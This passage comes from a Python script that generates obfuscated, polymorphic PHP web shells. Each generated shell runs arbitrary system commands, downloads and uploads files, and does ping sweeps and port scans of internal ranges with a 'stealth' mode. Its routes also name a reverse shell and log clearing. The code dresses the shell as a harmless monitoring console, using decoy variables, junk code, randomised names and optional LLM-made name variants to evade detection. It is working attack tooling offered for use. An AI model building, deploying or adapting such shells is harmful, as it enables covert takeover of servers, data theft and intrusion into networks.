            "            $__out2 = count($__open)",
            "                ? 'Open (' . count($__open) . \"/$__chk) [$__mode_str]:\\n\" . implode(\"\\n\", $__open)",
            "                : \"No open ports ($__chk pairs checked) [$__mode_str].\";",
            "            $response = ['stdout' => base64_encode($__out2), 'cwd' => base64_encode(getcwd())];",
            "            break;",
        ]),
        'pingsweep': "\n".join([
            f"        case '{routes['pingsweep']}':",
            f"            $__tg      = trim({pdec(p_target)});",
            f"            $__probe_r = trim({_pdec_ps_probe});",
            f"            $__mode    = trim({_pdec_mode});",
            f"            $__tout_r  = trim({_pdec_timeout});",
            f"            $__pause_r = trim({_pdec_pause});",
            "            if (!$__tg) {",
            "                $response = ['stdout' => base64_encode('Usage: pingsweep <target[,target|cidr|range]> [--ports minimal|web|full|N,N] [--stealth|--fast] [--timeout N] [--pause N]'), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            $__presets = [",
            "                'fast'    => ['t' => 0.1, 'p' => 0],",
            "                'default' => ['t' => 0.3, 'p' => 0],",
            "                'stealth' => ['t' => 1.0, 'p' => 200],",
            "            ];",
            "            $__pr = $__presets[in_array($__mode, ['fast','stealth']) ? $__mode : 'default'];",
            "            $__timeout  = ($__tout_r  !== '') ? max(0.05, (float)$__tout_r)  : $__pr['t'];",
            "            $__pause_ms = ($__pause_r !== '') ? max(0,    (int)$__pause_r)   : $__pr['p'];",
            "            $__probe_presets = ['web' => [80, 443, 8080, 8443], 'minimal' => [22, 80], 'full' => [22, 80, 443, 8080, 3389, 3306, 5432, 6379, 27017]];",
            "            $__raw_probe = $__probe_r !== '' ? $__probe_r : '80,443,22';",
            "            $__probe_ports = isset($__probe_presets[$__raw_probe])",
            "                ? $__probe_presets[$__raw_probe]",
            "                : array_filter(array_map('intval', explode(',', $__raw_probe)), fn($__p2) => $__p2 > 0 && $__p2 <= 65535);",
            "            if (!$__probe_ports) $__probe_ports = [80, 443, 22];",
            "            $__probe_ports = array_values($__probe_ports);",
            "            // --- IP parsing ---",
            "            $__ips = [];",
            "            foreach (array_filter(array_map('trim', explode(',', $__tg))) as $__tg_part) {",
            "                if ($__tg_part === '') continue;",
            "                if (strpos($__tg_part, '/') !== false) {",
            "                    [$__cip, $__cbits] = explode('/', $__tg_part, 2);",
            "                    $__cbits = min(max((int)$__cbits, 16), 32);",
            "                    $__cbase = ip2long($__cip);",
            "                    if ($__cbase !== false) {",
            "                        $__ccount = 1 << (32 - $__cbits);",
            "                        $__cstart = ($__cbase & ~($__ccount - 1)) + 1;",
            "                        for ($__ci = 0; $__ci < $__ccount - 2 && count($__ips) < 1024; $__ci++) {",
            "                            $__ips[] = long2ip($__cstart + $__ci);",
            "                        }",
            "                    }",
            "                } elseif (strpos($__tg_part, '-') !== false) {",
            "                    [$__r1, $__r2] = explode('-', $__tg_part, 2);",
            "                    $__r1 = trim($__r1); $__r2 = trim($__r2);",
            "                    if (strpos($__r2, '.') !== false) {",
            "                        $__rs = ip2long($__r1); $__re = ip2long($__r2);",
            "                        if ($__rs !== false && $__re !== false && $__re >= $__rs) {",
            "                            for ($__ri = $__rs; $__ri <= $__re && count($__ips) < 1024; $__ri++) $__ips[] = long2ip($__ri);",
            "                        }",
            "                    } elseif (preg_match('/^(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.)(\\\\d{1,3})$/', $__r1, $__rm2)) {",
            "                        for ($__i = (int)$__rm2[2]; $__i <= min((int)$__r2, 254) && count($__ips) < 1024; $__i++) $__ips[] = $__rm2[1].$__i;",
            "                    }",
            "                } else {",
            "                    $__ips[] = $__tg_part;",
            "                }",
            "            }",
            "            $__ips = array_values(array_unique($__ips));",
            "            if (!$__ips) {",
            "                $response = ['stdout' => base64_encode('No valid targets parsed from: ' . $__tg), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            $__up = []; $__chk = 0;",
            "            foreach ($__ips as $__ip) {",
            "                $__alive = false;",
            "                foreach ($__probe_ports as $__pp) {",
            "                    $__s = @fsockopen($__ip, $__pp, $__en, $__es, $__timeout);",
            "                    if ($__s) { fclose($__s); $__alive = true; break; }",
            "                }",
            "                if ($__alive) $__up[] = $__ip;",
            "                $__chk++;",
            "                if ($__pause_ms > 0) usleep($__pause_ms * 1000);",
            "            }",
            "            $__mode_str = ($__tout_r !== '' || $__pause_r !== '') ? \"custom(t={$__timeout}s,p={$__pause_ms}ms)\" : $__mode;",
            "            $__out3 = count($__up)",
            "                ? 'Up (' . count($__up) . \"/$__chk) [probed: \" . implode(',', $__probe_ports) . \"] [$__mode_str]:\\n\" . implode(\"\\n\", $__up)",
            "                : \"No hosts up ($__chk checked) [probed: \" . implode(',', $__probe_ports) . \"] [$__mode_str].\";",
            "            $response = ['stdout' => base64_encode($__out3), 'cwd' => base64_encode(getcwd())];",
            "            break;",
        ]),
    }
    switch_body = "\n".join(case_blocks[c] for c in case_order)

    junk_before_str = "\n".join(junk_before)
    junk_after_str  = "\n".join(junk_after)

    title_str = T['app_name']
    ver_str   = T['version_prefix'] + ver

    # ── Auth block (session + login gate, or empty for --no-auth) ──
    if no_auth:
        auth_block = ""
    else:
        auth_block = f"""session_name('{n['sess_name']}');
session_start(['cookie_httponly' => true, 'use_strict_mode' => true, 'cookie_samesite' => 'Lax']);

define('{n['sess_const']}', '{session_key_val}');
define('{n['user_const']}', '{username}');
define('{n['hash_const']}', '{bcrypt_hash}');

function {n['is_session']}(): bool {{
    return isset($_SESSION[{n['sess_const']}]) && $_SESSION[{n['sess_const']}] === true;
}}

function {n['start_session']}(): void {{
    $_SESSION[{n['sess_const']}] = true;
}}

function {n['safe_cmp']}($a, $b): bool {{
    return hash_equals($a, $b);
}}

function {n['check_creds']}(string $login, string $password): bool {{
    return {n['safe_cmp']}($login, {n['user_const']}) && password_verify($password, {n['hash_const']});
}}

if (!{n['is_session']}()) {{
    $__err = false;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'], $_POST['password'])) {{
        if ({n['check_creds']}($_POST['login'], $_POST['password'])) {{
            {n['start_session']}();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }} else {{
            $__err = true;
            usleep(random_int(400000, 700000));
        }}
    }}
    header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title><?= htmlspecialchars('{title_str}') ?> - Access</title>
  <style>
    body {{ background: {T['body_bg']}; color: {T['body_fg']}; font-family: monospace;
           display: flex; align-items: center; justify-content: center;
           height: 100vh; margin: 0; }}
    .auth-form {{ background: {T['form_bg']}; padding: 20px;
                  border: 1px solid {T['form_border']};
                  box-shadow: 0 0 12px rgba(0,0,0,.3);
                  border-radius: 6px; width: 280px; }}
    .auth-form input {{ width: 100%; padding: 8px; margin: 10px 0;
                        background: {T['input_bg']}; border: 1px solid {T['input_border']};
                        color: {T['input_fg2']}; font-family: monospace;
                        box-sizing: border-box; }}
    .auth-form button {{ padding: 8px 14px; background: {T['btn_bg']};
                         color: {T['btn_fg']}; font-weight: bold;
                         border: none; cursor: pointer; width: 100%; }}
    .auth-form h3 {{ margin: 0 0 10px; }}
    .auth-note {{ font-size: 10px; color: {T['note_fg']}; margin-top: 8px; }}
    .auth-error {{ color: {T['error_fg']}; font-size: 11px; margin-top: -6px;
                   transition: opacity .3s ease-in-out; }}
  </style>
  <script>
    window.addEventListener("DOMContentLoaded", function() {{
      var e = document.querySelector('.auth-error');
      if (e) setTimeout(function() {{ e.style.opacity = 0; }}, Math.floor(Math.random()*3000)+2000);
    }});
  </script>
</head>
<body>
  <form class="auth-form" method="POST">
    <h3>{title_str} {ver_str}</h3>
    <input type="text" name="login" placeholder="Username" required autofocus />
    <input type="password" name="password" placeholder="Password" required />
    <?php if ($__err): ?>
      <div class="auth-error">Invalid username or password.</div>
    <?php endif; ?>
    <button type="submit"><?php echo $__err ? "Retry" : "Access"; ?></button>
    <div class="auth-note">Authentication required.</div>
  </form>
</body>
</html>
<?php
    exit;
}}"""

    # ── CSS ──
    css = f"""
    :root {{
      --shell-margin: 25px;
    }}
    @media (min-width: 1200px) {{
      :root {{ --shell-margin: 50px !important; }}
    }}
    @media (max-width: 991px), (max-height: 600px) {{
      :root {{ --shell-margin: 0 !important; }}
      #{ids['shell']} {{ resize: none; }}
    }}
    @media (max-width: 767px) {{
      #{ids['entry']} {{ flex-direction: column; }}
    }}
    html, body {{
      margin: 0; padding: 0;
      width: 100vw; height: 100vh;
      background: {T['body_bg']};
      color: {T['body_fg']};
      font-family: 'Courier New', monospace;
      overflow: hidden;
      letter-spacing: 0.5px;
    }}
    *::-webkit-scrollbar-track {{ border-radius: 8px; background-color: {T['scroll_track']}; }}
    *::-webkit-scrollbar {{ width: 8px; height: 8px; }}
    *::-webkit-scrollbar-thumb {{ border-radius: 8px; background-color: {T['scroll_thumb']}; }}
    #{ids['shell']} {{
      background: {T['shell_bg']};
      box-shadow: 0 0 25px {T['shell_glow']};
      font-size: 10pt;
      display: flex; flex-direction: column; align-items: stretch;
      width: 100%; height: 100%;
      max-width: calc(100vw - 2 * var(--shell-margin));
      max-height: calc(100vh - 2 * var(--shell-margin));
      margin: var(--shell-margin) auto;
      overflow: hidden; resize: both;
      border: 1px solid {T['shell_border']};
    }}
    #{ids['stream']} {{
      padding: 12px; overflow: auto; white-space: pre-wrap;
      flex-grow: 1; font-size: 10.2pt; line-height: 1.4;
      color: {T['stream_fg']};
    }}
    .{ids['header']} {{
      font-weight: bold; color: {T['header_fg']};
      text-align: center; padding: 10px;
      font-size: 11px; letter-spacing: 2px;
      text-shadow: 0 0 4px {T['header_shadow']};
    }}
    .{ids['prompt_cls']} {{
      font-weight: bold; color: {T['prompt_fg']};
    }}
    .{ids['prompt_cls']} > span {{
      color: {T['prompt_host_fg']};
    }}
    #{ids['entry']} {{
      display: flex; border-top: 1px solid {T['entry_border']};
      box-shadow: 0 -2px 5px rgba(0,0,0,.4);
      padding: 10px 12px; background-color: {T['entry_bg']};
    }}
    #{ids['entry']} > label {{
      flex-grow: 0; display: block; padding: 0 6px;
      height: 30px; line-height: 30px; color: {T['prompt_fg']};
    }}
    #{ids['entry']} #{ids['cmd']} {{
      height: 30px; line-height: 30px; width: 100%;
      border: none; outline: none; background: transparent;
      color: {T['input_fg']}; font-family: monospace; font-size: 10pt;
    }}
    #{ids['entry']} div {{ flex-grow: 1; display: flex; align-items: stretch; }}
    /* Login form */
    body.login-view {{
      display: flex; align-items: center; justify-content: center;
    }}
    .auth-form {{
      background: {T['form_bg']}; padding: 20px;
      border: 1px solid {T['form_border']};
      box-shadow: 0 0 12px rgba(0,0,0,0.3);
      border-radius: 6px; width: 280px;
    }}
    .auth-form input {{
      width: 100%; padding: 8px; margin: 10px 0;
      background: {T['input_bg']}; border: 1px solid {T['input_border']};
      color: {T['input_fg2']}; font-family: monospace; box-sizing: border-box;
    }}
    .auth-form button {{
      padding: 8px 14px; background: {T['btn_bg']};
      color: {T['btn_fg']}; font-weight: bold;
      border: none; cursor: pointer; width: 100%;
    }}
    .auth-form h3 {{ margin: 0 0 10px; }}
    .auth-note {{ font-size: 10px; color: {T['note_fg']}; margin-top: 8px; }}
    .auth-error {{
      color: {T['error_fg']}; font-size: 11px; margin-top: -6px;
    }}
"""

    # ── JS decoy vars ──
    decoy_js_vars = ""
    decoy_var_names = [
        "sessionUID","nodeHeartbeat","telemetryBuffer","nodeGroup","userPrivileges",
        "streamContext","diagnosticsCache","shellTheme","licenseTier","isInMaintenance",
        "lastSyncTimestamp","pendingCommands","authRetryCount","resourceStatsSnapshot",
        "isTrustedDevice","cmdEchoEnabled","connectionHealth","featureToggles",
        "auditSessionId","isSyncInProgress","forceLegacyFallback",
    ]
    decoy_vals = [
        '"sess-" + Math.random().toString(36).substr(2,12)',
        'null', '[]',
        '"cluster-eu-west-01"',
        '["read","exec"]',
        '"default"', '{}',
        '"infra-dark"', '"Enterprise"', 'false', 'null', '[]',
        '0', '{}', 'true', 'true', '"stable"',
        '{allowUpload:true,showDeprecated:false,useCompressedLogs:true}',
        '"AUD-" + Date.now()', 'false', 'false',
    ]
    for vname, vval in zip(decoy_var_names, decoy_vals):
        decoy_js_vars += f"            var {vname} = {vval};\n"

    # ── JS functions ──

    php_output = f"""<?php

{junk_before_str}

function {n['load_settings']}($path = '/etc/app.json') {{
    if (!file_exists($path)) return [];
    $json = @file_get_contents($path);
    return @json_decode($json, true) ?: [];
}}

function {n['save_settings']}($data, $path = '/etc/app.json') {{
    if (!is_array($data)) return false;
    return @file_put_contents($path, json_encode($data, JSON_PRETTY_PRINT));
}}

${cfg} = ['username' => 'admin', 'hostname' => 'localhost'];

function {n['is_windows']}() {{
    return stripos(PHP_OS, "WIN") === 0;
}}

function {n['check_funcs']}($list) {{
    if (!is_array($list) || empty($list)) return false;
    foreach ($list as $e) {{
        if (!is_string($e) || !function_exists($e)) return false;
    }}
    return true;
}}

function {n['exec_cmd']}($cmd) {{
    $output = '';
    if (!is_string($cmd) || trim($cmd) === '') return $output;
{fallback_block}
    return $output;
}}

function {n['expand_tilde']}($path) {{
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $m)) {{
        $o = [];
        exec("echo " . escapeshellarg($m[1]), $o);
        return rtrim($o[0] ?? '', "/") . ($m[2] ?? '');
    }}
    return $path;
}}

function {n['read_file']}($filePath) {{
    $file = @file_get_contents($filePath);
    if (!is_string($file)) {{
        return ['stdout' => base64_encode('File not found / no read permission.'), 'cwd' => base64_encode(getcwd())];
    }}
    return ['name' => base64_encode(basename($filePath)), 'file' => base64_encode($file)];
}}

function {n['write_file']}($path, $file, $cwd) {{
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if (!is_resource($f)) {{
        return ['stdout' => base64_encode('Invalid path / no write permission.'), 'cwd' => base64_encode(getcwd())];
    }}
    @fwrite($f, base64_decode($file));
    @fclose($f);
    return ['stdout' => base64_encode('Done.'), 'cwd' => base64_encode(getcwd())];
}}

function {n['get_cwd']}() {{
    return ['cwd' => base64_encode(getcwd())];
}}

function {n['tab_complete']}($fileName, $cwd, $type) {{
    chdir($cwd);
    $fileName = escapeshellarg($fileName);
    $cmd = ($type === 'cmd') ? "compgen -c $fileName" : "compgen -f $fileName";
    $cmd = escapeshellcmd("/bin/bash -c $cmd");
    $files = @shell_exec($cmd);
    $files = explode("\\n", $files === null ? '' : $files);
    foreach ($files as &$f) {{ $f = base64_encode($f); }}
    return ['files' => $files];
}}

function {n['resolve_task']}($cmd, $cwd) {{
    $stdout = "";
    if (!is_string($cmd) || trim($cmd) === "") {{
        return ['stdout' => base64_encode(""), 'cwd' => base64_encode($cwd)];
    }}
    chdir($cwd);
    if (preg_match("/^\\s*cd\\s*(2>&1)?$/i", $cmd)) {{
        @chdir({n['expand_tilde']}("~"));
    }} elseif (preg_match("/^\\s*cd\\s+(.+)\\s*(2>&1)?$/i", $cmd, $m)) {{
        @chdir({n['expand_tilde']}($m[1]));
    }} elseif (preg_match("/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/i", $cmd, $m)) {{
        return {n['read_file']}($m[1]);
    }} else {{
        $stdout = {n['exec_cmd']}($cmd);
    }}
    return ['stdout' => base64_encode($stdout), 'cwd' => base64_encode(getcwd())];
}}

function {n['get_env_info']}() {{
    global ${cfg};
    if ({n['is_windows']}()) {{
        $u = @getenv('USERNAME');
        if (is_string($u) && trim($u) !== '') ${cfg}['username'] = $u;
    }} else {{
        $pw = @posix_getpwuid(@posix_geteuid());
        if (is_array($pw) && isset($pw['name'])) ${cfg}['username'] = $pw['name'];
    }}
    $h = @gethostname();
    if (is_string($h) && trim($h) !== '') ${cfg}['hostname'] = $h;
}}

{junk_after_str}

{auth_block}

{php_transport_inject}
if (isset($_GET['{route_param}'])) {{
    $response = null;
    switch ($_GET['{route_param}']) {{
{switch_body}
    }}
    header("Content-Type: {php_ct}");
    {php_echo}
    exit;
}} else {{
    {n['get_env_info']}();
    header('Content-Type: text/html; charset=utf-8');
}}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>{title_str} | {ver_str}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex,nofollow" />
  <style>
{css}
  </style>
  <script>
        const SYSTEM_PROFILE = {{
            build: "{ver_str}",
            env: "production",
            nodeGroup: "eu-{rnd_token(rng,4)}-infra",
            updateChannel: "stable"
        }};
        const FEATURE_FLAGS = {{
            enableTelemetrySync: false,
            enableAutoPatch: {rng.choice(['true','false'])},
            enableLegacyMode: false,
            auditMode: "{rng.choice(['partial','full','passive'])}"
        }};
        const SECURITY_CONTEXT = {{
            tokenHash: "d41d8cd98f00b204e9800998ecf8427e",
            sessionTTL: {rng.choice([600,900,1800])},
            allowDebugConsole: false
        }};
{decoy_js_vars}
        var {jfn['cfg']} = <?php echo json_encode(${cfg}); ?>;
        var {jfn['cwd']} = null;
        var {jfn['cmd_history']} = [];
        var {jfn['history_pos']} = 0;
        var {jfn['e_input']} = null;
        var {jfn['e_content']} = null;

        function {jfn['neutralize_html']}(str) {{
            if (typeof str !== "string") return "";
            return str.replace(/&/g,"&amp;").replace(/</g,"&lt;")
                      .replace(/>/g,"&gt;").replace(/"/g,"&quot;")
                      .replace(/'/g,"&#39;");
        }}

        function {jfn['b64u']}(s) {{
            if (!s) return '';
            try {{ return decodeURIComponent(escape(atob(s))); }} catch(e) {{ return atob(s); }}
        }}

        function {jfn['get_header']}(cwd) {{
            var fullCwd = (typeof cwd === "string" && cwd.trim()) ? cwd : "~";
            var shortCwd = fullCwd;
            var parts = fullCwd.split("/").filter(Boolean);
            if (parts.length > 2) {{
                shortCwd = "…/" + parts[parts.length - 2] + "/" + parts[parts.length - 1];
            }}
            var username = {jfn['cfg']}["username"] || "user";
            var hostname = {jfn['cfg']}["hostname"] || "host";
            return username + "@" + hostname + ":<span title=\\"" + fullCwd + "\\">" + shortCwd + "</span>#";
        }}

        function {jfn['update_meta']}() {{
            var el = document.getElementById("{ids['prompt']}");
            if (!el) return;
            el.innerHTML = {jfn['get_header']}({jfn['cwd']}) + '<span></span>';
        }}

        function {jfn['append_line']}(command) {{
            if (typeof command !== "string" || !command.trim()) return;
            var prompt = '<span class="{ids['prompt_cls']}">' + {jfn['get_header']}({jfn['cwd']}) + '</span> ';
            var safe = {jfn['neutralize_html']}(command);
            {jfn['e_content']}.innerHTML += "\\n\\n" + prompt + safe + "\\n";
            {jfn['e_content']}.scrollTop = {jfn['e_content']}.scrollHeight;
        }}

        function {jfn['insert_stdout']}(stdout) {{
            if (typeof stdout !== "string" || !stdout.trim()) return;
            {jfn['e_content']}.innerHTML += {jfn['neutralize_html']}(stdout);
            {jfn['e_content']}.scrollTop = {jfn['e_content']}.scrollHeight;
        }}

{js_transport_inject}
        function {jfn['pipe_call']}(url, params, callback) {{
            if (typeof url !== "string" || !url.trim()) return;
            var qs = Object.keys(params).map(function(k) {{
                var v = params[k];
                return encodeURIComponent(k) + "=" + encodeURIComponent({js_enc});
            }}).join("&");
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {{
                if (xhr.readyState === 4) {{
                    if (xhr.status === 200) {{
                        try {{ var r=xhr.responseText; callback({js_dec}); }}
                        catch(e) {{ {jfn['insert_stdout']}("Malformed response."); }}
                    }} else {{
                        {jfn['insert_stdout']}("Request failed [" + xhr.status + "]");
                    }}
                }}
            }};
            xhr.send(qs);
        }}

        function {jfn['refresh_scope']}(cwd) {{
            var nc = (typeof cwd === "string" && cwd.trim()) ? cwd : null;
            if (nc) {{ {jfn['cwd']} = nc; {jfn['update_meta']}(); return; }}
            {jfn['pipe_call']}("?{route_param}={routes['pwd']}", {{}}, function(r) {{
                {jfn['cwd']} = (r && r.cwd) ? {jfn['b64u']}(r.cwd) : "~";
                {jfn['update_meta']}();
            }});
        }}

        function {jfn['save_blob']}(name, file) {{
            if (typeof name !== "string" || typeof file !== "string") {{
                {jfn['insert_stdout']}("Download failed: invalid parameters.");
                return;
            }}
            var link = document.createElement("a");
            link.href = "data:application/octet-stream;base64," + file;
            link.download = name;
            link.style.display = "none";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            {jfn['insert_stdout']}("Done.");
        }}

        function {jfn['file_to_stream']}(file) {{
            return new Promise(function(resolve, reject) {{
                if (!(file instanceof File)) {{ reject(new Error("Invalid input")); return; }}
                var reader = new FileReader();
                reader.onload = function() {{
                    var m = reader.result.match(/^data:.*?;base64,(.*)$/);
                    m && m[1] ? resolve(m[1]) : reject(new Error("b64 extract failed"));
                }};
                reader.onerror = function() {{ reject(new Error("File read error")); }};
                reader.readAsDataURL(file);
            }});
        }}

        function {jfn['trigger_export']}(path) {{
            if (typeof path !== "string" || !path.trim()) {{
                {jfn['insert_stdout']}("Upload failed: invalid path.");
                return;
            }}
            var inp = document.createElement("input");
            inp.type = "file"; inp.style.display = "none";
            document.body.appendChild(inp);
            inp.addEventListener("change", function() {{
                var f = inp.files[0];
                if (!f) {{ {jfn['insert_stdout']}("Upload cancelled."); document.body.removeChild(inp); return; }}
                {jfn['file_to_stream']}(f).then(function(b64) {{
                    {jfn['pipe_call']}("?{route_param}={routes['upload']}", {{path: path, file: b64, cwd: {jfn['cwd']}}}, function(r) {{
                        {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
                        {jfn['refresh_scope']}({jfn['b64u']}(r.cwd || ""));
                    }});
                }}).catch(function() {{
                    {jfn['insert_stdout']}("Upload failed: client error.");
                }}).finally(function() {{
                    document.body.removeChild(inp);
                }});
            }});
            inp.click();
        }}

        function {jfn['resolve_task']}(command) {{
            if (typeof command !== "string" || !command.trim()) return;
            {jfn['append_line']}(command);
{js_feature_interceptors}
            var m = command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/);
            if (m) {{ {jfn['trigger_export']}(m[1]); return; }}
            if (/^\\s*clear\\s*$/.test(command)) {{ {jfn['e_content']}.innerHTML = ''; return; }}
            {jfn['pipe_call']}("?{route_param}={routes['shell']}", {{cmd: command, cwd: {jfn['cwd']}}}, function(r) {{
                if (r && typeof r === "object") {{
                    if (r.hasOwnProperty('file')) {{
                        {jfn['save_blob']}({jfn['b64u']}(r.name), r.file);
                    }} else {{
                        {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
                        {jfn['refresh_scope']}({jfn['b64u']}(r.cwd || ""));
                    }}
                }} else {{
                    {jfn['insert_stdout']}("Invalid response.");
                }}
            }});
        }}

        function {jfn['suggest_entry']}() {{
            var val = {jfn['e_input']}.value.trim();
            if (!val) return;
            var parts = val.split(/\\s+/);
            var type = (parts.length === 1) ? "cmd" : "file";
            var fname = (type === "cmd") ? parts[0] : parts[parts.length - 1];
            {jfn['pipe_call']}("?{route_param}={routes['hint']}", {{filename: fname, cwd: {jfn['cwd']}, type: type}}, function(d) {{
                if (!d || !Array.isArray(d.files) || d.files.length <= 1) return;
                var decoded = d.files.map(function(f) {{ return {jfn['b64u']}(f); }});
                if (decoded.length === 2) {{
                    {jfn['e_input']}.value = (type === "cmd") ? decoded[0] : val.replace(/([^\\s]*)$/, decoded[0]);
                }} else {{
                    {jfn['append_line']}(val);
                    {jfn['insert_stdout']}(decoded.join("\\n"));
                }}
            }});
        }}

        function {jfn['cache_query']}(cmd) {{
            if (typeof cmd !== "string" || !cmd.trim()) return;
            if ({jfn['cmd_history']}.length === 0 || {jfn['cmd_history']}[{jfn['cmd_history']}.length-1] !== cmd.trim()) {{
                {jfn['cmd_history']}.push(cmd.trim());
            }}
            {jfn['history_pos']} = {jfn['cmd_history']}.length;
        }}

        function {jfn['dispatch_key']}(event) {{
            if (!event || typeof event !== "object") return;
            switch (event.key) {{
                case "Enter":
                    var cmd = {jfn['e_input']}.value.trim();
                    if (!cmd) return;
                    {jfn['resolve_task']}(cmd);
                    {jfn['cache_query']}(cmd);
                    {jfn['e_input']}.value = "";
                    break;
                case "ArrowUp":
                    if ({jfn['history_pos']} > 0) {{
                        {jfn['history_pos']}--;
                        {jfn['e_input']}.blur();
                        {jfn['e_input']}.value = {jfn['cmd_history']}[{jfn['history_pos']}];
                        setTimeout(function() {{ {jfn['e_input']}.focus(); }}, 0);
                    }}
                    break;
                case "ArrowDown":
                    if ({jfn['history_pos']} >= {jfn['cmd_history']}.length) break;
                    {jfn['history_pos']}++;
                    {jfn['e_input']}.blur(); {jfn['e_input']}.focus();
                    {jfn['e_input']}.value = ({jfn['history_pos']} === {jfn['cmd_history']}.length)
                        ? "" : {jfn['cmd_history']}[{jfn['history_pos']}];
                    break;
                case "Tab":
                    event.preventDefault();
                    {jfn['suggest_entry']}();
                    break;
                case "Escape":
                    {jfn['e_input']}.value = "";
                    break;
                case "l":
                    if (event.ctrlKey) {{ event.preventDefault(); {jfn['e_content']}.innerHTML = ""; }}
                    break;
                case "c":
                    if (event.ctrlKey) {{ event.preventDefault(); {jfn['append_line']}("^C"); {jfn['e_input']}.value = ""; }}
                    break;
                case "u":
                    if (event.ctrlKey) {{ event.preventDefault(); {jfn['e_input']}.value = ""; }}
                    break;
            }}
        }}

        document.addEventListener("click", function(e) {{
            var sel = window.getSelection();
            if (!e.target || e.target.tagName === "SELECT") return;
            if (!sel || !sel.toString()) {{ if ({jfn['e_input']}) {jfn['e_input']}.focus(); }}
        }});

        window.addEventListener("load", function() {{
            {jfn['e_input']} = document.getElementById("{ids['cmd']}");
            {jfn['e_content']} = document.getElementById("{ids['stream']}");
            if ({jfn['e_input']} && {jfn['e_content']}) {{
                {jfn['refresh_scope']}();
                {jfn['e_input']}.focus();
            }}
        }});
  </script>
</head>
<body>
  <div id="{ids['shell']}"
       data-module-id="RM-{rnd_token(rng,8)}"
       data-internal-ref="<?php echo bin2hex(random_bytes(6)); ?>"
       data-revision="{ver_str}"
       data-role="monitoring-shell"
       aria-live="polite"
       tabindex="0">
    <pre id="{ids['stream']}"
         data-scope="telemetry"
         data-role="execution-log"
         aria-label="Session log"
         tabindex="0"></pre>
    <div id="{ids['entry']}" data-panel-scope="user-interaction">
      <label for="{ids['cmd']}" id="{ids['prompt']}" class="{ids['prompt_cls']}" data-label-mode="adaptive">context</label>
      <div>
        <input
          id="{ids['cmd']}"
          type="text"
          onkeydown="{jfn['dispatch_key']}(event)"
          autocomplete="off"
          autocapitalize="off"
          spellcheck="false"
          aria-describedby="{ids['prompt']}"
        />
      </div>
    </div>
    <div id="ping-watcher" style="display:none;">
      <span data-last-ping="<?php echo date('Y-m-d\\TH:i:s'); ?>"></span>
    </div>
  </div>
</body>
</html>
"""
    return php_output

# ─────────────────────────────────────────────────────────────────────────────
# SHELL GENERATION
# ─────────────────────────────────────────────────────────────────────────────

def generate(args, info=None):
    if info is None:
        info = sys.stdout
    rng = random.Random(args.seed)

    junk_count = args.junk if args.junk is not None else rng.randint(20, 80)
    theme = args.theme if args.theme else rng.choice(list(CSS_THEMES.keys()))

    # Optional LLM pool augmentation (opt-in via --llm; static pools on failure).
    # Local copies only — the module-level pools are never mutated.
    llm = getattr(args, 'llm_provider', None)
    php_pool   = list(PHP_FUNC_POOL)
    js_pool    = list(JS_FUNC_POOL)
    mimic_pool = list(MIMIC_PARAM_POOL)
    poly_names = list(POLY_APP_NAMES)
    junk_words: list = []
    if llm:
        names  = llm.variants('func_names', 60, rng,
                              exclude=set(PHP_FUNC_POOL) | set(JS_FUNC_POOL))
        params = llm.variants('mimic_params', 25, rng, exclude=set(MIMIC_PARAM_POOL))
        apps   = llm.variants('app_names', 12, rng, exclude=set(POLY_APP_NAMES))
        words  = llm.variants('junk_words', 30, rng)
        php_pool   += names[:45]
        js_pool    += names[45:]
        mimic_pool += params
        poly_names += apps
        junk_words  = words
        if names or params or apps or words:
            print(f"[+] LLM       : {llm.provider}:{llm.model} — "
                  f"+{len(names)} names, +{len(params)} params, "
                  f"+{len(apps)} app names, +{len(words)} words", file=info)
        else:
            print(f"[!] LLM       : {llm.provider}:{llm.model} unavailable "
                  f"or empty — static pools only", file=info)

    # Routing tokens
    route_param = rnd_token(rng, 6)
    routes = {
        'shell':     rnd_token(rng, 7),
        'pwd':       rnd_token(rng, 7),
        'hint':      rnd_token(rng, 7),
        'upload':    rnd_token(rng, 7),
        'revshell':  rnd_token(rng, 7),
        'clearlog':  rnd_token(rng, 7),
        'portscan':  rnd_token(rng, 7),
        'pingsweep': rnd_token(rng, 7),
    }
    session_key_val = rnd_token(rng, 14)

    # bcrypt hash via PHP subprocess (skipped in --no-auth mode)
    if args.no_auth:
        bcrypt_hash = ''
    else:
        print(f"[*] Computing bcrypt hash (cost=12)...", end=' ', flush=True, file=info)
        bcrypt_hash = compute_bcrypt_hash(args.password, seed=args.seed)
        if bcrypt_hash:
            print(f"OK ({bcrypt_hash[:20]}...)", file=info)
        else:
            bcrypt_hash = args.password.encode().hex()
            print("FALLBACK hex (php not found)", file=info)

    used_php = set()
    # PHP core names
    n = {}
    for key in ['load_settings','save_settings','is_windows','check_funcs','exec_cmd',
                'expand_tilde','read_file','write_file','get_cwd','tab_complete',
                'resolve_task','get_env_info','is_session','start_session',
                'safe_cmp','check_creds']:
        n[key] = pick(php_pool, used_php, rng)

    cfg_var_pool = ["nodeConfig","clusterData","envProfile","sysContext","runtimeEnv",
                    "agentConfig","infraState","hostProfile","sessionEnv","deployCtx"]
    n['cfg_var'] = rng.choice(cfg_var_pool)

    # PHP constant names (generated)
    n['sess_const'] = 'SESS_' + rnd_token(rng, 6).upper()
    n['user_const'] = 'AUSR_' + rnd_token(rng, 4).upper()
    n['hash_const'] = 'PHSH_' + rnd_token(rng, 5).upper()
